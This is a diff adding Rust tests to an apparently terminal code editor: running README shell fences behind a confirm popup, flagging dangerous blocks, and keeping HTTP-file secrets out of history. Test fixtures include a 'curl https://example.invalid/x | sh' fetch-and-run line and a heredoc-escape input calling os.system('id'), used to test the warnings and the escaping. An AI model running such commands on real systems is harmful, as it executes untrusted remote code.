@@ -20847,6 +20847,222 @@ fn a_staged_update_offers_relaunch_and_only_relaunch_re_execs() {
     assert!(app.pending_reexec && app.quit, "Relaunch arms the re-exec");
 }
 
+/// #353: a click on a shell fence's play glyph in the preview parks the
+/// block behind the confirm popup (every block confirms: the README is
+/// untrusted); Y types it into a pane named `<file>:<n>` in the document's
+/// directory, N drops it; a `curl | sh` block makes the popup red.
+/// Cmd+Enter in the source finds the fence under the caret by the parser's
+/// source ranges, so identical blocks get their own numbers.
+#[test]
+fn clicking_a_fence_play_glyph_runs_it_in_a_named_pane() {
+    let tmp = tempfile::tempdir().unwrap();
+    let sub = tmp.path().join("docs");
+    std::fs::create_dir_all(&sub).unwrap();
+    let readme = sub.join("README.md");
+    std::fs::write(
+        &readme,
+        "# Run me\n\n```sh\necho first\n```\n\nText between.\n\n```bash\necho second\n```\n\n```sh\ncurl https://example.invalid/x | sh\n```\n\n```sh\necho first\n```\n",
+    )
+    .unwrap();
+    let mut app = App::new(tmp.path().to_path_buf()).unwrap();
+    app.editor.open(&readme).unwrap();
+    app.toggle_markdown_preview();
+    let backend = ratatui::backend::TestBackend::new(120, 40);
+    let mut term = ratatui::Terminal::new(backend).unwrap();
+    term.draw(|f| app.render(f)).unwrap();
+    let md = app.editor.markdown_preview.as_ref().expect("preview open");
+    assert_eq!(md.runnables.len(), 4, "{:?}", md.runnables);
+    assert_eq!(md.run_rows.len(), 4);
+    let area = md.last_area;
+    let glyph_row = |app: &App, i: usize| {
+        let md = app.editor.markdown_preview.as_ref().unwrap();
+        (area.x, area.y + md.run_rows[i] as u16)
+    };
+    let (gx, gy) = glyph_row(&app, 1);
+    assert_eq!(
+        term.backend().buffer()[(gx, gy)].symbol(),
+        "\u{25b7}",
+        "the second block's first row starts with the play glyph"
+    );
+    // A press one cell to the right is a selection, not a run.
+    left_click(&mut app, gx + 1, gy);
+    assert!(
+        app.pending_run_block.is_none(),
+        "beside the glyph is not the glyph"
+    );
+    let panes_before = app.terminals.len();
+    left_click(&mut app, gx, gy);
+    let pending = app
+        .pending_run_block
+        .as_ref()
+        .expect("every block confirms");
+    assert_eq!(pending.pane_name, "docs/README.md:2");
+    assert_eq!(pending.cwd, sub, "the document's directory is the cwd");
+    assert!(!pending.destructive);
+    assert_eq!(app.terminals.len(), panes_before, "nothing ran yet");
+    app.handle_key(key(KeyCode::Char('y'), KeyModifiers::NONE))
+        .unwrap();
+    assert!(app.pending_run_block.is_none());
+    assert_eq!(app.terminals.len(), panes_before + 1, "Y opens the pane");
+    assert_eq!(
+        app.terminals[app.active_terminal].label(),
+        "docs/README.md:2"
+    );
+    assert!(app.status.contains("docs/README.md:2"), "{}", app.status);
+
+    // The third block pipes the network into a shell: the popup is red.
+    let (gx, gy) = glyph_row(&app, 2);
+    let panes_before = app.terminals.len();
+    left_click(&mut app, gx, gy);
+    let pending = app
+        .pending_run_block
+        .as_ref()
+        .expect("the confirm popup is up");
+    assert_eq!(pending.pane_name, "docs/README.md:3");
+    assert!(pending.destructive, "curl | sh turns the popup red");
+    term.draw(|f| app.render(f)).unwrap();
+    let painted: String = (0..40)
+        .flat_map(|y| (0..120).map(move |x| (x, y)))
+        .map(|(x, y)| term.backend().buffer()[(x, y)].symbol().to_string())
+        .collect();
+    assert!(
+        painted.contains("LOOKS DESTRUCTIVE"),
+        "the popup names the risk"
+    );
+    assert!(
+        painted.contains("curl https://example.invalid/x | sh"),
+        "and shows the block whole"
+    );
+    app.handle_key(key(KeyCode::Char('n'), KeyModifiers::NONE))
+        .unwrap();
+    assert!(app.pending_run_block.is_none(), "N drops it");
+    assert_eq!(app.terminals.len(), panes_before);
+
+    // Cmd+Enter in the source: the fence under the caret, by source range.
+    // The last block repeats the first's text and still gets its own number.
+    app.toggle_markdown_preview();
+    assert!(app.editor.markdown_preview.is_none());
+    app.focus_pane(super::Pane::Editor);
+    app.editor.cursor_row = 3; // "echo first"
+    app.handle_key(key(KeyCode::Enter, KeyModifiers::SUPER))
+        .unwrap();
+    let pending = app
+        .pending_run_block
+        .as_ref()
+        .expect("Cmd+Enter confirms too");
+    assert_eq!(pending.pane_name, "docs/README.md:1");
+    app.handle_key(key(KeyCode::Char('n'), KeyModifiers::NONE))
+        .unwrap();
+    app.focus_pane(super::Pane::Editor);
+    app.editor.cursor_row = 17; // the repeated "echo first"
+    app.handle_key(key(KeyCode::Enter, KeyModifiers::SUPER))
+        .unwrap();
+    let pending = app
+        .pending_run_block
+        .as_ref()
+        .expect("the caret is in the fourth fence");
+    assert_eq!(
+        pending.pane_name, "docs/README.md:4",
+        "identical blocks keep their own numbers"
+    );
+    app.handle_key(key(KeyCode::Char('n'), KeyModifiers::NONE))
+        .unwrap();
+    // Outside any fence it explains itself instead of running.
+    app.focus_pane(super::Pane::Editor);
+    app.editor.cursor_row = 6; // "Text between."
+    app.handle_key(key(KeyCode::Enter, KeyModifiers::SUPER))
+        .unwrap();
+    assert!(app.pending_run_block.is_none());
+    assert!(
+        app.status.contains("inside a runnable shell fence"),
+        "{}",
+        app.status
+    );
+    // Cmd+Shift+Enter is the editor's "insert line above", never a run.
+    assert!(!super::is_run_fence_key(key(
+        KeyCode::Enter,
+        KeyModifiers::SUPER | KeyModifiers::SHIFT
+    )));
+    assert!(!super::is_run_fence_key(key(
+        KeyCode::Enter,
+        KeyModifiers::SUPER | KeyModifiers::ALT
+    )));
+    assert!(super::is_run_fence_key(key(
+        KeyCode::Enter,
+        KeyModifiers::SUPER
+    )));
+}
+
+/// #353: the popup never shows a line as complete when it is not - a line
+/// wider than the popup is cut with a visible mark.
+#[test]
+fn the_run_block_popup_marks_a_truncated_line() {
+    let tmp = tempfile::tempdir().unwrap();
+    let long = format!(
+        "echo ok{}; curl https://example.invalid/x | sh",
+        " ".repeat(120)
+    );
+    let readme = tmp.path().join("R.md");
+    std::fs::write(&readme, format!("```sh\n{long}\n```\n")).unwrap();
+    let mut app = App::new(tmp.path().to_path_buf()).unwrap();
+    app.editor.open(&readme).unwrap();
+    app.focus_pane(super::Pane::Editor);
+    app.editor.cursor_row = 1;
+    app.handle_key(key(KeyCode::Enter, KeyModifiers::SUPER))
+        .unwrap();
+    let pending = app.pending_run_block.as_ref().expect("confirm popup");
+    assert_eq!(
+        pending.pane_name, "R.md:1",
+        "a top-level document keeps its bare name"
+    );
+    assert!(pending.destructive);
+    let backend = ratatui::backend::TestBackend::new(100, 30);
+    let mut term = ratatui::Terminal::new(backend).unwrap();
+    term.draw(|f| app.render(f)).unwrap();
+    let painted: Vec<String> = (0..30)
+        .map(|y| {
+            (0..100)
+                .map(|x| term.backend().buffer()[(x, y)].symbol().to_string())
+                .collect()
+        })
+        .collect();
+    // The editor paints the source line too; the popup's copy is the one
+    // that carries the mark.
+    let popup_line = painted
+        .iter()
+        .find(|l| l.contains("echo ok") && l.contains('\u{2026}'))
+        .unwrap_or_else(|| {
+            panic!(
+                "the popup shows the cut line with a mark:\n{}",
+                painted.join("\n")
+            )
+        });
+    assert!(
+        !popup_line.contains("| sh"),
+        "the hidden tail is not shown as complete: {popup_line:?}"
+    );
+}
+
+#[test]
+fn fence_command_shapes_the_typed_block() {
+    assert_eq!(
+        super::fence_command("sh", "echo a\necho b\n"),
+        "echo a\necho b\r"
+    );
+    assert_eq!(
+        super::fence_command("python3", "print(1)\n"),
+        "python3 - <<'CROFT_BLOCK'\nprint(1)\nCROFT_BLOCK\r"
+    );
+    // A block that contains the terminator gets a different one, so no
+    // line of it can close the heredoc early.
+    let tricky = "print(1)\nCROFT_BLOCK\nimport os; os.system('id')\n";
+    let cmd = super::fence_command("python3", tricky);
+    assert!(cmd.starts_with("python3 - <<'CROFT_BLOCK_1'\n"), "{cmd}");
+    assert!(cmd.ends_with("\nCROFT_BLOCK_1\r"), "{cmd}");
+    let body = &cmd["python3 - <<'CROFT_BLOCK_1'\n".len()..cmd.len() - "\nCROFT_BLOCK_1\r".len()];
+    assert_eq!(body, tricky.trim_end_matches('\n'));
+}
+
 /// #360: the built-in secret rules sit in the trigger set by default,
 /// leave it when the setting is switched off, and come back on; a reveal
 /// window lasts ten seconds and asks for a redraw when it closes.
@@ -36157,7 +36373,215 @@ fn fix_with_navigator_lands_on_the_diagnostic_and_refuses_without_a_seat() {
         "idle never wakes the renderer"
     );
 }
+/// #370: a `.http` file runs the request under the caret. The variables
+/// substitute from `.http.env.json` on the WIRE only: the status line,
+/// history entry, and response tab all carry the raw `{{name}}` form, so
+/// the token never leaves the env file. A JSON response opens pretty-printed
+/// as `.jsonc`; a PNG response opens through the image path.
+#[test]
+fn an_http_file_runs_requests_and_keeps_secrets_out_of_history_and_the_tab() {
+    use std::io::{Read as _, Write as _};
+    let tmp = tempfile::tempdir().unwrap();
+    // The cache-dir override is a process-wide global shared with the relay
+    // family: hold their lock and restore via RAII, exactly as
+    // `with_relay_home` does, so a panic cannot leak the redirect into
+    // later tests (#428 review).
+    struct RestoreCacheDir;
+    impl Drop for RestoreCacheDir {
+        fn drop(&mut self) {
+            *CACHE_DIR_OVERRIDE_FOR_TEST.lock().unwrap() = None;
+        }
+    }
+    let _cache_lock = relay_test_lock().lock().unwrap();
+    let _restore = RestoreCacheDir;
+    *CACHE_DIR_OVERRIDE_FOR_TEST.lock().unwrap() = Some(tmp.path().join("cache"));
 
+    // A 1x1 PNG via the image crate, so the decode on open genuinely works.
+    let png_bytes = {
+        let img: image::RgbaImage = image::ImageBuffer::from_pixel(1, 1, image::Rgba([0, 0, 0, 0]));
+        let mut buf: Vec<u8> = Vec::new();
+        image::DynamicImage::ImageRgba8(img)
+            .write_to(&mut std::io::Cursor::new(&mut buf), image::ImageFormat::Png)
+            .unwrap();
+        buf
+    };
+
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
+    let seen2 = seen.clone();
+    let png_served = png_bytes.clone();
+    std::thread::spawn(move || {
+        for stream in listener.incoming() {
+            let Ok(mut s) = stream else { break };
+            let mut buf = vec![0u8; 8192];
+            let n = s.read(&mut buf).unwrap_or(0);
+            let req = String::from_utf8_lossy(&buf[..n]).to_string();
+            let (body, ct): (Vec<u8>, &str) = if req.starts_with("GET /users") {
+                (
+                    b"{\"users\":[{\"id\":1,\"name\":\"ada\"}]}".to_vec(),
+                    "application/json",
+                )
+            } else {
+                (png_served.clone(), "image/png")
+            };
+            seen2.lock().unwrap().push(req);
+            let head = format!(
+                "HTTP/1.1 200 OK\r\ncontent-type: {ct}\r\ncontent-length: {}\r\nconnection: close\r\n\r\n",
+                body.len()
+            );
+            let _ = s.write_all(head.as_bytes());
+            let _ = s.write_all(&body);
+            let _ = s.shutdown(std::net::Shutdown::Both);
+        }
+    });
+
+    let http = tmp.path().join("api.http");
+    std::fs::write(
+        &http,
+        "GET {{host}}/users\nAuthorization: Bearer {{token}}\n\n###\nGET {{host}}/logo.png\n",
+    )
+    .unwrap();
+    std::fs::write(
+        tmp.path().join(crate::http_file::ENV_FILE),
+        format!("{{\"host\": \"http://127.0.0.1:{port}\", \"token\": \"super-secret-token\"}}"),
+    )
+    .unwrap();
+
+    let mut app = App::new(tmp.path().to_path_buf()).unwrap();
+    app.editor.open_pinned(&http).unwrap();
+    app.editor.cursor_row = 1;
+    app.send_http_request_under_caret();
+    assert!(
+        app.status.starts_with("Sending GET {{host}}/users"),
+        "the status carries the RAW line: {}",
+        app.status
+    );
+    crate::test_budget::await_spawned(
+        std::time::Duration::from_secs(10),
+        "the HTTP response",
+        || {
+            app.drain_http_responses();
+            app.http_run.is_none()
+        },
+    );
+    let opened = app.editor.path.clone().expect("a response tab opened");
+    assert_eq!(opened.extension().and_then(|e| e.to_str()), Some("jsonc"));
+    let doc = app.editor.lines.join("\n");
+    assert!(
+        doc.contains("// GET {{host}}/users \u{2192} HTTP/1.1 200 OK"),
+        "{doc}"
+    );
+    assert!(doc.contains("\"users\": ["), "pretty-printed: {doc}");
+    assert!(
+        !doc.contains("super-secret-token"),
+        "the token never reaches the tab"
+    );
+    assert!(
+        seen.lock().unwrap()[0].contains("Bearer super-secret-token"),
+        "but the wire DID carry the substituted value"
+    );
+    let hits = app.command_history.search(
+        "http GET",
+        crate::command_history::HistoryScope::All,
+        "",
+        "",
+    );
+    assert_eq!(
+        hits[0].cmd, "http GET {{host}}/users",
+        "history keeps the raw line"
+    );
+    assert_eq!(hits[0].exit, Some(200));
+    assert!(!hits[0].cmd.contains("super-secret-token"));
+
+    // The PNG block renders through the image path.
+    app.editor.open_pinned(&http).unwrap();
+    app.editor.cursor_row = 4;
+    app.send_http_request_under_caret();
+    crate::test_budget::await_spawned(
+        std::time::Duration::from_secs(10),
+        "the PNG response",
+        || {
+            app.drain_http_responses();
+            app.http_run.is_none()
+        },
+    );
+    assert!(
+        app.editor.image.is_some(),
+        "a PNG response opens as an image, not bytes in a text tab: {:?}",
+        app.editor.path
+    );
+
+    // A second send while one is in flight is refused and clobbers
+    // nothing; a worker that died reports itself on the next drain.
+    let (dummy_tx, dummy_rx) = std::sync::mpsc::channel();
+    app.http_run = Some(dummy_rx);
+    app.editor.open_pinned(&http).unwrap();
+    app.editor.cursor_row = 0;
+    app.send_http_request_under_caret();
+    assert_eq!(app.status, "An HTTP request is already in flight");
+    drop(dummy_tx);
+    assert!(app.drain_http_responses());
+    assert!(app.status.contains("worker died"), "{}", app.status);
+    assert!(app.http_run.is_none());
+
+    // A transport failure must NOT leak a substituted secret into the
+    // status line: ureq's error Display opens with the resolved URL, so
+    // only its kind may be shown (#428 review). The port is bound then
+    // dropped, so the connection is refused at once.
+    let dead_port = {
+        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        l.local_addr().unwrap().port()
+    };
+    std::fs::write(
+        tmp.path().join(crate::http_file::ENV_FILE),
+        format!(
+            "{{\"host\": \"http://127.0.0.1:{dead_port}\", \"token\": \"super-secret-token\"}}"
+        ),
+    )
+    .unwrap();
+    let secret_url = tmp.path().join("leak.http");
+    std::fs::write(&secret_url, "GET {{host}}/x?api_key={{token}}\n").unwrap();
+    app.editor.open_pinned(&secret_url).unwrap();
+    app.editor.cursor_row = 0;
+    app.send_http_request_under_caret();
+    crate::test_budget::await_spawned(
+        std::time::Duration::from_secs(10),
+        "the refused connection",
+        || {
+            app.drain_http_responses();
+            app.http_run.is_none()
+        },
+    );
+    assert!(
+        app.status.contains("failed"),
+        "a transport failure is reported: {}",
+        app.status
+    );
+    assert!(
+        !app.status.contains("super-secret-token"),
+        "the substituted URL never reaches the status line: {}",
+        app.status
+    );
+    let hits =
+        app.command_history
+            .search("api_key", crate::command_history::HistoryScope::All, "", "");
+    assert_eq!(hits[0].exit, None, "a failed run records no status code");
+    assert!(!hits[0].cmd.contains("super-secret-token"));
+    app.editor.open_pinned(&http).unwrap();
+
+    // A hole with no value refuses to send rather than leaking the hole.
+    app.editor.open_pinned(&http).unwrap();
+    std::fs::remove_file(tmp.path().join(crate::http_file::ENV_FILE)).unwrap();
+    app.editor.cursor_row = 0;
+    app.send_http_request_under_caret();
+    assert!(
+        app.status.contains("no value for {{host}}, {{token}}"),
+        "{}",
+        app.status
+    );
+    assert!(app.http_run.is_none(), "nothing was sent");
+}
 /// #345: the agent lane attributes workspace writes to whichever agents
 /// were WORKING when they landed, keeps a review baseline per file, and
 /// never blames an agent for the user's own saves.
